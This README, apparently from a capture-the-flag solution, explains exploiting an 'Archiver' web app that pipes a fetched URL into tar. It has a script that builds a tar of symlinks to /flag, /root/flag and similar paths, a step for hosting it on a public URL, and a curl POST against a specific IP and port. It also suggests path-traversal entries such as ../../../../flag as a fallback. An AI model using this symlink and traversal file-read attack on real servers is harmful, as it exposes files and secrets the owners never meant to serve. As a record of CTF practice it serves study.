# Hosting exploit tar for the Archiver app

This repository contains `make_symlink_tar.py` which creates `exploit.tar` containing several symlink entries that point to common flag locations (for example `/flag`, `/flag.txt`, `/root/flag`, `/home/ctf/flag`).

How to use

1. Run the script locally (optional verification):

```powershell
Set-Location 'C:\Users\Alexandru Moga\Documents\first-gooogot-game\explo'
python .\make_symlink_tar.py
# this produces exploit.tar in the same directory
```

2. Upload `exploit.tar` to a public GitHub repository. After pushing the file, obtain the raw URL (example):

```
https://raw.githubusercontent.com/<youruser>/<repo>/main/exploit.tar
```

3. Point the vulnerable Archiver app at the raw URL by POSTing the URL in the `url` form field, or use curl:

```powershell
# using curl on your machine (the server will fetch this URL)
curl -X POST -d "url=https://raw.githubusercontent.com/<youruser>/<repo>/main/exploit.tar" http://89.144.35.159:1337/
```

What this does

The Archiver app will run:

```
curl -sk '<URL you provided>' | tar --no-overwrite-dir --no-same-owner --no-same-permissions -xf -
```

When `exploit.tar` is fetched and extracted inside the app's `uploads/<unique>` directory, it will create symlink entries such as `flag` that point to absolute paths like `/flag` or `/flag.txt`. The web app then lists files in that `uploads/<unique>` directory and provides links to them. If the webserver follows symlinks when serving static files, visiting the `uploads/.../flag` link will return the contents of the real target file (the flag).

Notes and caveats

- GitHub raw URLs serve the file with correct MIME and should work with `curl` on the target server. If GitHub blocks access from the target, you can host the tar on any public HTTP server reachable by the target.

- If the target's `tar` refuses or blocks symlink extraction, try creating a tar with a single file named `flag` whose contents are a path-traversal read instruction (less likely). Another option is to include a file named `../../../../flag` (path traversal) but many tars will sanitize or the server may block absolute/parent paths.

- Use this only on systems you have permission to test.
